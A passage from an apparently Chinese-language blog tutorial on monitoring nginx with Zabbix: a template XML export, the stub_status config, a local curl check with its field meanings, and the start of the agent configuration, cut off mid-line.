&lt;multiplier&gt;0&lt;/multiplier&gt;</span><br><span class=\"line\">                    &lt;snmp_oid/&gt;</span><br><span class=\"line\">                    &lt;key&gt;nginx.status[ping]&lt;/key&gt;</span><br><span class=\"line\">                    &lt;delay&gt;60&lt;/delay&gt;</span><br><span class=\"line\">                    &lt;<span class=\"built_in\">history</span>&gt;30&lt;/<span class=\"built_in\">history</span>&gt;</span><br><span class=\"line\">                    &lt;trends&gt;365&lt;/trends&gt;</span><br><span class=\"line\">                    &lt;status&gt;0&lt;/status&gt;</span><br><span class=\"line\">                    &lt;value_<span class=\"built_in\">type</span>&gt;3&lt;/value_<span class=\"built_in\">type</span>&gt;</span><br><span class=\"line\">                    &lt;allowed_hosts/&gt;</span><br><span class=\"line\">                    &lt;units/&gt;</span><br><span class=\"line\">                    &lt;delta&gt;0&lt;/delta&gt;</span><br><span class=\"line\">                    &lt;snmpv3_contextname/&gt;</span><br><span class=\"line\">                    &lt;snmpv3_securityname/&gt;</span><br><span class=\"line\">                    &lt;snmpv3_securitylevel&gt;0&lt;/snmpv3_securitylevel&gt;</span><br><span class=\"line\">                    &lt;snmpv3_authprotocol&gt;0&lt;/snmpv3_authprotocol&gt;</span><br><span class=\"line\">                    &lt;snmpv3_authpassphrase/&gt;</span><br><span class=\"line\">                    &lt;snmpv3_privprotocol&gt;0&lt;/snmpv3_privprotocol&gt;</span><br><span class=\"line\">                    &lt;snmpv3_privpassphrase/&gt;</span><br><span class=\"line\">                    &lt;formula&gt;1&lt;/formula&gt;</span><br><span class=\"line\">                    &lt;delay_flex/&gt;</span><br><span class=\"line\">                    &lt;params/&gt;</span><br><span class=\"line\">                    &lt;ipmi_sensor/&gt;</span><br><span class=\"line\">                    &lt;data_<span class=\"built_in\">type</span>&gt;0&lt;/data_<span class=\"built_in\">type</span>&gt;</span><br><span class=\"line\">                    &lt;authtype&gt;0&lt;/authtype&gt;</span><br><span class=\"line\">                    &lt;username/&gt;</span><br><span class=\"line\">                    &lt;password/&gt;</span><br><span class=\"line\">                    &lt;publickey/&gt;</span><br><span class=\"line\">                    &lt;privatekey/&gt;</span><br><span class=\"line\">                    &lt;port/&gt;</span><br><span class=\"line\">                    &lt;description&gt;is live&lt;/description&gt;</span><br><span class=\"line\">                    &lt;inventory_link&gt;0&lt;/inventory_link&gt;</span><br><span class=\"line\">                    &lt;applications&gt;</span><br><span class=\"line\">                        &lt;application&gt;</span><br><span class=\"line\">                            &lt;name&gt;nginx&lt;/name&gt;</span><br><span class=\"line\">                        &lt;/application&gt;</span><br><span class=\"line\">                    &lt;/applications&gt;</span><br><span class=\"line\">                    &lt;valuemap&gt;</span><br><span class=\"line\">                        &lt;name&gt;Service state&lt;/name&gt;</span><br><span class=\"line\">                    &lt;/valuemap&gt;</span><br><span class=\"line\">                    &lt;logtimefmt/&gt;</span><br><span class=\"line\">                &lt;/item&gt;</span><br><span class=\"line\">                &lt;item&gt;</span><br><span class=\"line\">                    &lt;name&gt;nginx status server accepts&lt;/name&gt;</span><br><span class=\"line\">                    &lt;<span class=\"built_in\">type</span>&gt;0&lt;/<span class=\"built_in\">type</span>&gt;</span><br><span class=\"line\">                    &lt;snmp_community/&gt;</span><br><span class=\"line\">                    &lt;multiplier&gt;0&lt;/multiplier&gt;</span><br><span class=\"line\">                    &lt;snmp_oid/&gt;</span><br><span class=\"line\">                    &lt;key&gt;nginx.status[accepts]&lt;/key&gt;</span><br><span class=\"line\">                    &lt;delay&gt;60&lt;/delay&gt;</span><br><span class=\"line\">                    &lt;<span class=\"built_in\">history</span>&gt;90&lt;/<span class=\"built_in\">history</span>&gt;</span><br><span class=\"line\">                    &lt;trends&gt;365&lt;/trends&gt;</span><br><span class=\"line\">                    &lt;status&gt;0&lt;/status&gt;</span><br><span class=\"line\">                    &lt;value_<span class=\"built_in\">type</span>&gt;3&lt;/value_<span class=\"built_in\">type</span>&gt;</span><br><span class=\"line\">                    &lt;allowed_hosts/&gt;</span><br><span class=\"line\">                    &lt;units/&gt;</span><br><span class=\"line\">                    &lt;delta&gt;1&lt;/delta&gt;</span><br><span class=\"line\">                    &lt;snmpv3_contextname/&gt;</span><br><span class=\"line\">                    &lt;snmpv3_securityname/&gt;</span><br><span class=\"line\">                    &lt;snmpv3_securitylevel&gt;0&lt;/snmpv3_securitylevel&gt;</span><br><span class=\"line\">                    &lt;snmpv3_authprotocol&gt;0&lt;/snmpv3_authprotocol&gt;</span><br><span class=\"line\">                    &lt;snmpv3_authpassphrase/&gt;</span><br><span class=\"line\">                    &lt;snmpv3_privprotocol&gt;0&lt;/snmpv3_privprotocol&gt;</span><br><span class=\"line\">                    &lt;snmpv3_privpassphrase/&gt;</span><br><span class=\"line\">                    &lt;formula&gt;1&lt;/formula&gt;</span><br><span class=\"line\">                    &lt;delay_flex/&gt;</span><br><span class=\"line\">                    &lt;params/&gt;</span><br><span class=\"line\">                    &lt;ipmi_sensor/&gt;</span><br><span class=\"line\">                    &lt;data_<span class=\"built_in\">type</span>&gt;0&lt;/data_<span class=\"built_in\">type</span>&gt;</span><br><span class=\"line\">                    &lt;authtype&gt;0&lt;/authtype&gt;</span><br><span class=\"line\">                    &lt;username/&gt;</span><br><span class=\"line\">                    &lt;password/&gt;</span><br><span class=\"line\">                    &lt;publickey/&gt;</span><br><span class=\"line\">                    &lt;privatekey/&gt;</span><br><span class=\"line\">                    &lt;port/&gt;</span><br><span class=\"line\">                    &lt;description&gt;accepts&lt;/description&gt;</span><br><span class=\"line\">                    &lt;inventory_link&gt;0&lt;/inventory_link&gt;</span><br><span class=\"line\">                    &lt;applications&gt;</span><br><span class=\"line\">                        &lt;application&gt;</span><br><span class=\"line\">                            &lt;name&gt;nginx&lt;/name&gt;</span><br><span class=\"line\">                        &lt;/application&gt;</span><br><span class=\"line\">                    &lt;/applications&gt;</span><br><span class=\"line\">                    &lt;valuemap/&gt;</span><br><span class=\"line\">                    &lt;logtimefmt/&gt;</span><br><span class=\"line\">                &lt;/item&gt;</span><br><span class=\"line\">                &lt;item&gt;</span><br><span class=\"line\">                    &lt;name&gt;nginx status server handled&lt;/name&gt;</span><br><span class=\"line\">                    &lt;<span class=\"built_in\">type</span>&gt;0&lt;/<span class=\"built_in\">type</span>&gt;</span><br><span class=\"line\">                    &lt;snmp_community/&gt;</span><br><span class=\"line\">                    &lt;multiplier&gt;0&lt;/multiplier&gt;</span><br><span class=\"line\">                    &lt;snmp_oid/&gt;</span><br><span class=\"line\">                    &lt;key&gt;nginx.status[handled]&lt;/key&gt;</span><br><span class=\"line\">                    &lt;delay&gt;60&lt;/delay&gt;</span><br><span class=\"line\">                    &lt;<span class=\"built_in\">history</span>&gt;90&lt;/<span class=\"built_in\">history</span>&gt;</span><br><span class=\"line\">                    &lt;trends&gt;365&lt;/trends&gt;</span><br><span class=\"line\">                    &lt;status&gt;0&lt;/status&gt;</span><br><span class=\"line\">                    &lt;value_<span class=\"built_in\">type</span>&gt;3&lt;/value_<span class=\"built_in\">type</span>&gt;</span><br><span class=\"line\">                    &lt;allowed_hosts/&gt;</span><br><span class=\"line\">                    &lt;units/&gt;</span><br><span class=\"line\">                    &lt;delta&gt;1&lt;/delta&gt;</span><br><span class=\"line\">                    &lt;snmpv3_contextname/&gt;</span><br><span class=\"line\">                    &lt;snmpv3_securityname/&gt;</span><br><span class=\"line\">                    &lt;snmpv3_securitylevel&gt;0&lt;/snmpv3_securitylevel&gt;</span><br><span class=\"line\">                    &lt;snmpv3_authprotocol&gt;0&lt;/snmpv3_authprotocol&gt;</span><br><span class=\"line\">                    &lt;snmpv3_authpassphrase/&gt;</span><br><span class=\"line\">                    &lt;snmpv3_privprotocol&gt;0&lt;/snmpv3_privprotocol&gt;</span><br><span class=\"line\">                    &lt;snmpv3_privpassphrase/&gt;</span><br><span class=\"line\">                    &lt;formula&gt;1&lt;/formula&gt;</span><br><span class=\"line\">                    &lt;delay_flex/&gt;</span><br><span class=\"line\">                    &lt;params/&gt;</span><br><span class=\"line\">                    &lt;ipmi_sensor/&gt;</span><br><span class=\"line\">                    &lt;data_<span class=\"built_in\">type</span>&gt;0&lt;/data_<span class=\"built_in\">type</span>&gt;</span><br><span class=\"line\">                    &lt;authtype&gt;0&lt;/authtype&gt;</span><br><span class=\"line\">                    &lt;username/&gt;</span><br><span class=\"line\">                    &lt;password/&gt;</span><br><span class=\"line\">                    &lt;publickey/&gt;</span><br><span class=\"line\">                    &lt;privatekey/&gt;</span><br><span class=\"line\">                    &lt;port/&gt;</span><br><span class=\"line\">                    &lt;description&gt;handled&lt;/description&gt;</span><br><span class=\"line\">                    &lt;inventory_link&gt;0&lt;/inventory_link&gt;</span><br><span class=\"line\">                    &lt;applications&gt;</span><br><span class=\"line\">                        &lt;application&gt;</span><br><span class=\"line\">                            &lt;name&gt;nginx&lt;/name&gt;</span><br><span class=\"line\">                        &lt;/application&gt;</span><br><span class=\"line\">                    &lt;/applications&gt;</span><br><span class=\"line\">                    &lt;valuemap/&gt;</span><br><span class=\"line\">                    &lt;logtimefmt/&gt;</span><br><span class=\"line\">                &lt;/item&gt;</span><br><span class=\"line\">                &lt;item&gt;</span><br><span class=\"line\">                    &lt;name&gt;nginx status server requests&lt;/name&gt;</span><br><span class=\"line\">                    &lt;<span class=\"built_in\">type</span>&gt;0&lt;/<span class=\"built_in\">type</span>&gt;</span><br><span class=\"line\">                    &lt;snmp_community/&gt;</span><br><span class=\"line\">                    &lt;multiplier&gt;0&lt;/multiplier&gt;</span><br><span class=\"line\">                    &lt;snmp_oid/&gt;</span><br><span class=\"line\">                    &lt;key&gt;nginx.status[requests]&lt;/key&gt;</span><br><span class=\"line\">                    &lt;delay&gt;60&lt;/delay&gt;</span><br><span class=\"line\">                    &lt;<span class=\"built_in\">history</span>&gt;90&lt;/<span class=\"built_in\">history</span>&gt;</span><br><span class=\"line\">                    &lt;trends&gt;365&lt;/trends&gt;</span><br><span class=\"line\">                    &lt;status&gt;0&lt;/status&gt;</span><br><span class=\"line\">                    &lt;value_<span class=\"built_in\">type</span>&gt;3&lt;/value_<span class=\"built_in\">type</span>&gt;</span><br><span class=\"line\">                    &lt;allowed_hosts/&gt;</span><br><span class=\"line\">                    &lt;units/&gt;</span><br><span class=\"line\">                    &lt;delta&gt;1&lt;/delta&gt;</span><br><span class=\"line\">                    &lt;snmpv3_contextname/&gt;</span><br><span class=\"line\">                    &lt;snmpv3_securityname/&gt;</span><br><span class=\"line\">                    &lt;snmpv3_securitylevel&gt;0&lt;/snmpv3_securitylevel&gt;</span><br><span class=\"line\">                    &lt;snmpv3_authprotocol&gt;0&lt;/snmpv3_authprotocol&gt;</span><br><span class=\"line\">                    &lt;snmpv3_authpassphrase/&gt;</span><br><span class=\"line\">                    &lt;snmpv3_privprotocol&gt;0&lt;/snmpv3_privprotocol&gt;</span><br><span class=\"line\">                    &lt;snmpv3_privpassphrase/&gt;</span><br><span class=\"line\">                    &lt;formula&gt;1&lt;/formula&gt;</span><br><span class=\"line\">                    &lt;delay_flex/&gt;</span><br><span class=\"line\">                    &lt;params/&gt;</span><br><span class=\"line\">                    &lt;ipmi_sensor/&gt;</span><br><span class=\"line\">                    &lt;data_<span class=\"built_in\">type</span>&gt;0&lt;/data_<span class=\"built_in\">type</span>&gt;</span><br><span class=\"line\">                    &lt;authtype&gt;0&lt;/authtype&gt;</span><br><span class=\"line\">                    &lt;username/&gt;</span><br><span class=\"line\">                    &lt;password/&gt;</span><br><span class=\"line\">                    &lt;publickey/&gt;</span><br><span class=\"line\">                    &lt;privatekey/&gt;</span><br><span class=\"line\">                    &lt;port/&gt;</span><br><span class=\"line\">                    &lt;description&gt;requests&lt;/description&gt;</span><br><span class=\"line\">                    &lt;inventory_link&gt;0&lt;/inventory_link&gt;</span><br><span class=\"line\">                    &lt;applications&gt;</span><br><span class=\"line\">                        &lt;application&gt;</span><br><span class=\"line\">                            &lt;name&gt;nginx&lt;/name&gt;</span><br><span class=\"line\">                        &lt;/application&gt;</span><br><span class=\"line\">                    &lt;/applications&gt;</span><br><span class=\"line\">                    &lt;valuemap/&gt;</span><br><span class=\"line\">                    &lt;logtimefmt/&gt;</span><br><span class=\"line\">                &lt;/item&gt;</span><br><span class=\"line\">            &lt;/items&gt;</span><br><span class=\"line\">            &lt;discovery_rules/&gt;</span><br><span class=\"line\">            &lt;macros/&gt;</span><br><span class=\"line\">            &lt;templates/&gt;</span><br><span class=\"line\">            &lt;screens/&gt;</span><br><span class=\"line\">        &lt;/template&gt;</span><br><span class=\"line\">    &lt;/templates&gt;</span><br><span class=\"line\">    &lt;triggers&gt;</span><br><span class=\"line\">        &lt;trigger&gt;</span><br><span class=\"line\">            &lt;expression&gt;{Template App NGINX:nginx.status[ping].last()}=0&lt;/expression&gt;</span><br><span class=\"line\">            &lt;name&gt;nginx was down!&lt;/name&gt;</span><br><span class=\"line\">            &lt;url/&gt;</span><br><span class=\"line\">            &lt;status&gt;0&lt;/status&gt;</span><br><span class=\"line\">            &lt;priority&gt;4&lt;/priority&gt;</span><br><span class=\"line\">            &lt;description&gt;NGINX&#x8FDB;&#x7A0B;&#x6570;&#xFF1A;0&#xFF0C;&#x8BF7;&#x6CE8;&#x610F;&lt;/description&gt;</span><br><span class=\"line\">            &lt;<span class=\"built_in\">type</span>&gt;0&lt;/<span class=\"built_in\">type</span>&gt;</span><br><span class=\"line\">            &lt;dependencies/&gt;</span><br><span class=\"line\">        &lt;/trigger&gt;</span><br><span class=\"line\">    &lt;/triggers&gt;</span><br><span class=\"line\">    &lt;graphs&gt;</span><br><span class=\"line\">        &lt;graph&gt;</span><br><span class=\"line\">            &lt;name&gt;nginx status connections&lt;/name&gt;</span><br><span class=\"line\">            &lt;width&gt;900&lt;/width&gt;</span><br><span class=\"line\">            &lt;height&gt;200&lt;/height&gt;</span><br><span class=\"line\">            &lt;yaxismin&gt;0.0000&lt;/yaxismin&gt;</span><br><span class=\"line\">            &lt;yaxismax&gt;100.0000&lt;/yaxismax&gt;</span><br><span class=\"line\">            &lt;show_work_period&gt;1&lt;/show_work_period&gt;</span><br><span class=\"line\">            &lt;show_triggers&gt;1&lt;/show_triggers&gt;</span><br><span class=\"line\">            &lt;<span class=\"built_in\">type</span>&gt;0&lt;/<span class=\"built_in\">type</span>&gt;</span><br><span class=\"line\">            &lt;show_legend&gt;1&lt;/show_legend&gt;</span><br><span class=\"line\">            &lt;show_3d&gt;0&lt;/show_3d&gt;</span><br><span class=\"line\">            &lt;percent_left&gt;0.0000&lt;/percent_left&gt;</span><br><span class=\"line\">            &lt;percent_right&gt;0.0000&lt;/percent_right&gt;</span><br><span class=\"line\">            &lt;ymin_<span class=\"built_in\">type</span>_1&gt;0&lt;/ymin_<span class=\"built_in\">type</span>_1&gt;</span><br><span class=\"line\">            &lt;ymax_<span class=\"built_in\">type</span>_1&gt;0&lt;/ymax_<span class=\"built_in\">type</span>_1&gt;</span><br><span class=\"line\">            &lt;ymin_item_1&gt;0&lt;/ymin_item_1&gt;</span><br><span class=\"line\">            &lt;ymax_item_1&gt;0&lt;/ymax_item_1&gt;</span><br><span class=\"line\">            &lt;graph_items&gt;</span><br><span class=\"line\">                &lt;graph_item&gt;</span><br><span class=\"line\">                    &lt;sortorder&gt;0&lt;/sortorder&gt;</span><br><span class=\"line\">                    &lt;drawtype&gt;0&lt;/drawtype&gt;</span><br><span class=\"line\">                    &lt;color&gt;00C800&lt;/color&gt;</span><br><span class=\"line\">                    &lt;yaxisside&gt;0&lt;/yaxisside&gt;</span><br><span class=\"line\">                    &lt;calc_fnc&gt;2&lt;/calc_fnc&gt;</span><br><span class=\"line\">                    &lt;<span class=\"built_in\">type</span>&gt;0&lt;/<span class=\"built_in\">type</span>&gt;</span><br><span class=\"line\">                    &lt;item&gt;</span><br><span class=\"line\">                        &lt;host&gt;Template App NGINX&lt;/host&gt;</span><br><span class=\"line\">                        &lt;key&gt;nginx.status[active]&lt;/key&gt;</span><br><span class=\"line\">                    &lt;/item&gt;</span><br><span class=\"line\">                &lt;/graph_item&gt;</span><br><span class=\"line\">                &lt;graph_item&gt;</span><br><span class=\"line\">                    &lt;sortorder&gt;1&lt;/sortorder&gt;</span><br><span class=\"line\">                    &lt;drawtype&gt;0&lt;/drawtype&gt;</span><br><span class=\"line\">                    &lt;color&gt;C80000&lt;/color&gt;</span><br><span class=\"line\">                    &lt;yaxisside&gt;0&lt;/yaxisside&gt;</span><br><span class=\"line\">                    &lt;calc_fnc&gt;2&lt;/calc_fnc&gt;</span><br><span class=\"line\">                    &lt;<span class=\"built_in\">type</span>&gt;0&lt;/<span class=\"built_in\">type</span>&gt;</span><br><span class=\"line\">                    &lt;item&gt;</span><br><span class=\"line\">                        &lt;host&gt;Template App NGINX&lt;/host&gt;</span><br><span class=\"line\">                        &lt;key&gt;nginx.status[reading]&lt;/key&gt;</span><br><span class=\"line\">                    &lt;/item&gt;</span><br><span class=\"line\">                &lt;/graph_item&gt;</span><br><span class=\"line\">                &lt;graph_item&gt;</span><br><span class=\"line\">                    &lt;sortorder&gt;2&lt;/sortorder&gt;</span><br><span class=\"line\">                    &lt;drawtype&gt;0&lt;/drawtype&gt;</span><br><span class=\"line\">                    &lt;color&gt;0000C8&lt;/color&gt;</span><br><span class=\"line\">                    &lt;yaxisside&gt;0&lt;/yaxisside&gt;</span><br><span class=\"line\">                    &lt;calc_fnc&gt;2&lt;/calc_fnc&gt;</span><br><span class=\"line\">                    &lt;<span class=\"built_in\">type</span>&gt;0&lt;/<span class=\"built_in\">type</span>&gt;</span><br><span class=\"line\">                    &lt;item&gt;</span><br><span class=\"line\">                        &lt;host&gt;Template App NGINX&lt;/host&gt;</span><br><span class=\"line\">                        &lt;key&gt;nginx.status[waiting]&lt;/key&gt;</span><br><span class=\"line\">                    &lt;/item&gt;</span><br><span class=\"line\">                &lt;/graph_item&gt;</span><br><span class=\"line\">                &lt;graph_item&gt;</span><br><span class=\"line\">                    &lt;sortorder&gt;3&lt;/sortorder&gt;</span><br><span class=\"line\">                    &lt;drawtype&gt;0&lt;/drawtype&gt;</span><br><span class=\"line\">                    &lt;color&gt;C800C8&lt;/color&gt;</span><br><span class=\"line\">                    &lt;yaxisside&gt;0&lt;/yaxisside&gt;</span><br><span class=\"line\">                    &lt;calc_fnc&gt;2&lt;/calc_fnc&gt;</span><br><span class=\"line\">                    &lt;<span class=\"built_in\">type</span>&gt;0&lt;/<span class=\"built_in\">type</span>&gt;</span><br><span class=\"line\">                    &lt;item&gt;</span><br><span class=\"line\">                        &lt;host&gt;Template App NGINX&lt;/host&gt;</span><br><span class=\"line\">                        &lt;key&gt;nginx.status[writing]&lt;/key&gt;</span><br><span class=\"line\">                    &lt;/item&gt;</span><br><span class=\"line\">                &lt;/graph_item&gt;</span><br><span class=\"line\">            &lt;/graph_items&gt;</span><br><span class=\"line\">        &lt;/graph&gt;</span><br><span class=\"line\">        &lt;graph&gt;</span><br><span class=\"line\">            &lt;name&gt;nginx status server&lt;/name&gt;</span><br><span class=\"line\">            &lt;width&gt;900&lt;/width&gt;</span><br><span class=\"line\">            &lt;height&gt;200&lt;/height&gt;</span><br><span class=\"line\">            &lt;yaxismin&gt;0.0000&lt;/yaxismin&gt;</span><br><span class=\"line\">            &lt;yaxismax&gt;100.0000&lt;/yaxismax&gt;</span><br><span class=\"line\">            &lt;show_work_period&gt;1&lt;/show_work_period&gt;</span><br><span class=\"line\">            &lt;show_triggers&gt;1&lt;/show_triggers&gt;</span><br><span class=\"line\">            &lt;<span class=\"built_in\">type</span>&gt;0&lt;/<span class=\"built_in\">type</span>&gt;</span><br><span class=\"line\">            &lt;show_legend&gt;1&lt;/show_legend&gt;</span><br><span class=\"line\">            &lt;show_3d&gt;0&lt;/show_3d&gt;</span><br><span class=\"line\">            &lt;percent_left&gt;0.0000&lt;/percent_left&gt;</span><br><span class=\"line\">            &lt;percent_right&gt;0.0000&lt;/percent_right&gt;</span><br><span class=\"line\">            &lt;ymin_<span class=\"built_in\">type</span>_1&gt;0&lt;/ymin_<span class=\"built_in\">type</span>_1&gt;</span><br><span class=\"line\">            &lt;ymax_<span class=\"built_in\">type</span>_1&gt;0&lt;/ymax_<span class=\"built_in\">type</span>_1&gt;</span><br><span class=\"line\">            &lt;ymin_item_1&gt;0&lt;/ymin_item_1&gt;</span><br><span class=\"line\">            &lt;ymax_item_1&gt;0&lt;/ymax_item_1&gt;</span><br><span class=\"line\">            &lt;graph_items&gt;</span><br><span class=\"line\">                &lt;graph_item&gt;</span><br><span class=\"line\">                    &lt;sortorder&gt;0&lt;/sortorder&gt;</span><br><span class=\"line\">                    &lt;drawtype&gt;0&lt;/drawtype&gt;</span><br><span class=\"line\">                    &lt;color&gt;00C800&lt;/color&gt;</span><br><span class=\"line\">                    &lt;yaxisside&gt;0&lt;/yaxisside&gt;</span><br><span class=\"line\">                    &lt;calc_fnc&gt;2&lt;/calc_fnc&gt;</span><br><span class=\"line\">                    &lt;<span class=\"built_in\">type</span>&gt;0&lt;/<span class=\"built_in\">type</span>&gt;</span><br><span class=\"line\">                    &lt;item&gt;</span><br><span class=\"line\">                        &lt;host&gt;Template App NGINX&lt;/host&gt;</span><br><span class=\"line\">                        &lt;key&gt;nginx.status[accepts]&lt;/key&gt;</span><br><span class=\"line\">                    &lt;/item&gt;</span><br><span class=\"line\">                &lt;/graph_item&gt;</span><br><span class=\"line\">                &lt;graph_item&gt;</span><br><span class=\"line\">                    &lt;sortorder&gt;1&lt;/sortorder&gt;</span><br><span class=\"line\">                    &lt;drawtype&gt;0&lt;/drawtype&gt;</span><br><span class=\"line\">                    &lt;color&gt;C80000&lt;/color&gt;</span><br><span class=\"line\">                    &lt;yaxisside&gt;0&lt;/yaxisside&gt;</span><br><span class=\"line\">                    &lt;calc_fnc&gt;2&lt;/calc_fnc&gt;</span><br><span class=\"line\">                    &lt;<span class=\"built_in\">type</span>&gt;0&lt;/<span class=\"built_in\">type</span>&gt;</span><br><span class=\"line\">                    &lt;item&gt;</span><br><span class=\"line\">                        &lt;host&gt;Template App NGINX&lt;/host&gt;</span><br><span class=\"line\">                        &lt;key&gt;nginx.status[handled]&lt;/key&gt;</span><br><span class=\"line\">                    &lt;/item&gt;</span><br><span class=\"line\">                &lt;/graph_item&gt;</span><br><span class=\"line\">                &lt;graph_item&gt;</span><br><span class=\"line\">                    &lt;sortorder&gt;2&lt;/sortorder&gt;</span><br><span class=\"line\">                    &lt;drawtype&gt;0&lt;/drawtype&gt;</span><br><span class=\"line\">                    &lt;color&gt;0000C8&lt;/color&gt;</span><br><span class=\"line\">                    &lt;yaxisside&gt;0&lt;/yaxisside&gt;</span><br><span class=\"line\">                    &lt;calc_fnc&gt;2&lt;/calc_fnc&gt;</span><br><span class=\"line\">                    &lt;<span class=\"built_in\">type</span>&gt;0&lt;/<span class=\"built_in\">type</span>&gt;</span><br><span class=\"line\">                    &lt;item&gt;</span><br><span class=\"line\">                        &lt;host&gt;Template App NGINX&lt;/host&gt;</span><br><span class=\"line\">                        &lt;key&gt;nginx.status[requests]&lt;/key&gt;</span><br><span class=\"line\">                    &lt;/item&gt;</span><br><span class=\"line\">                &lt;/graph_item&gt;</span><br><span class=\"line\">            &lt;/graph_items&gt;</span><br><span class=\"line\">        &lt;/graph&gt;</span><br><span class=\"line\">    &lt;/graphs&gt;</span><br><span class=\"line\">&lt;/zabbix_<span class=\"built_in\">export</span>&gt;</span><br></pre></td></tr></table></figure>","excerpt":"<blockquote>\n<p>zabbix&#x76D1;&#x63A7;nginx&#xFF0C;&#x9996;&#x5148;&#x9700;&#x8981;&#x914D;&#x7F6E;ngx_status</p>\n</blockquote>\n<h3 id=\"&#x542F;&#x7528;nginx-status&#x914D;&#x7F6E;\"><a href=\"#&#x542F;&#x7528;nginx-status&#x914D;&#x7F6E;\" class=\"headerlink\" title=\"&#x542F;&#x7528;nginx status&#x914D;&#x7F6E;\"></a>&#x542F;&#x7528;nginx status&#x914D;&#x7F6E;</h3><p>&#x5728;&#x9ED8;&#x8BA4;&#x4E3B;&#x673A;&#x91CC;&#x9762;&#x52A0;&#x4E0A;location&#x6216;&#x8005;&#x4F60;&#x5E0C;&#x671B;&#x80FD;&#x8BBF;&#x95EE;&#x5230;&#x7684;&#x4E3B;&#x673A;&#x91CC;&#x9762;&#x3002;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">server {</span><br><span class=\"line\">    listen  *:80 default_server;</span><br><span class=\"line\">    server_name _;</span><br><span class=\"line\">    location /nginx-status </span><br><span class=\"line\">    {</span><br><span class=\"line\">        stub_status on;</span><br><span class=\"line\">        access_<span class=\"built_in\">log</span> off;</span><br><span class=\"line\">        <span class=\"comment\">#allow 127.0.0.1;</span></span><br><span class=\"line\">        <span class=\"comment\">#deny all;</span></span><br><span class=\"line\">    }</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure></p>","more":"<h3 id=\"&#x91CD;&#x542F;nginx\"><a href=\"#&#x91CD;&#x542F;nginx\" class=\"headerlink\" title=\"&#x91CD;&#x542F;nginx\"></a>&#x91CD;&#x542F;nginx</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">service nginx restart</span><br></pre></td></tr></table></figure>\n<h3 id=\"&#x6253;&#x5F00;status&#x9875;&#x9762;\"><a href=\"#&#x6253;&#x5F00;status&#x9875;&#x9762;\" class=\"headerlink\" title=\"&#x6253;&#x5F00;status&#x9875;&#x9762;\"></a>&#x6253;&#x5F00;status&#x9875;&#x9762;</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># &#x5982;&#x679C;nginx&#x9ED8;&#x8BA4;&#x7AEF;&#x53E3;&#x4E0D;&#x662F;80 curl http://ip:port/nginx-status</span></span><br><span class=\"line\"><span class=\"comment\"># curl http://127.0.0.1/nginx-status</span></span><br><span class=\"line\">Active connections: 11921 </span><br><span class=\"line\">server accepts handled requests</span><br><span class=\"line\"> 11989 11989 11991 </span><br><span class=\"line\">Reading: 0 Writing: 7 Waiting: 42</span><br></pre></td></tr></table></figure>\n<h3 id=\"nginx-status&#x8BE6;&#x89E3;\"><a href=\"#nginx-status&#x8BE6;&#x89E3;\" class=\"headerlink\" title=\"nginx status&#x8BE6;&#x89E3;\"></a>nginx status&#x8BE6;&#x89E3;</h3><p>active connections &#x2013; &#x6D3B;&#x8DC3;&#x7684;&#x8FDE;&#x63A5;&#x6570;&#x91CF;<br>server accepts handled requests &#x2014; &#x603B;&#x5171;&#x5904;&#x7406;&#x4E86;11989&#x4E2A;&#x8FDE;&#x63A5; , &#x6210;&#x529F;&#x521B;&#x5EFA;11989&#x6B21;&#x63E1;&#x624B;, &#x603B;&#x5171;&#x5904;&#x7406;&#x4E86;11991&#x4E2A;&#x8BF7;&#x6C42;<br>reading &#x2014; &#x8BFB;&#x53D6;&#x5BA2;&#x6237;&#x7AEF;&#x7684;&#x8FDE;&#x63A5;&#x6570;.<br>writing &#x2014; &#x54CD;&#x5E94;&#x6570;&#x636E;&#x5230;&#x5BA2;&#x6237;&#x7AEF;&#x7684;&#x6570;&#x91CF;<br>waiting &#x2014; &#x5F00;&#x542F; keep-alive &#x7684;&#x60C5;&#x51B5;&#x4E0B;,&#x8FD9;&#x4E2A;&#x503C;&#x7B49;&#x4E8E; active &#x2013; (reading+writing), &#x610F;&#x601D;&#x5C31;&#x662F; Nginx &#x5DF2;&#x7ECF;&#x5904;&#x7406;&#x5B8C;&#x6B63;&#x5728;&#x7B49;&#x5019;&#x4E0B;&#x4E00;&#x6B21;&#x8BF7;&#x6C42;&#x6307;&#x4EE4;&#x7684;&#x9A7B;&#x7559;&#x8FDE;&#x63A5;.</p>\n<p><br></p>\n<hr>\n<h3 id=\"zabbix&#x5BA2;&#x6237;&#x7AEF;&#x914D;&#x7F6E;\"><a href=\"#zabbix&#x5BA2;&#x6237;&#x7AEF;&#x914D;&#x7F6E;\" class=\"headerlink\" title=\"zabbix&#x5BA2;&#x6237;&#x7AEF;&#x914D;&#x7F6E;\"></a>zabbix&#x5BA2;&#x6237;&#x7AEF;&#x914D;&#x7F6E;</h3><p>&#x5B89;&#x88C5;zabbix agent&#x5BA2;&#x6237;&#x7AEF;&#xFF0C;&#x5E76;&#x4FEE;&#x6539;zabbix_agentd.conf&#x6587;&#x4EF6;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># vim /etc/zabbix/zabbix_agentd.conf</span></span><br><span class=\"line\"></span><br><span class=\"line\">EnableRemoteCommands=1  &#x6765;&#x81F3;zabbix&#x670D;&#x52A1;&#x5668;&#x7684;&#x8FDC;&#x7A0B;&#x547D;&#x4EE4;&#x662F;&#x5426;&#x5141;&#x8BB8;&#x88AB;&#x6267;&#x884C;</span><br><span class=\"line\">Server=zabbix_server_IP  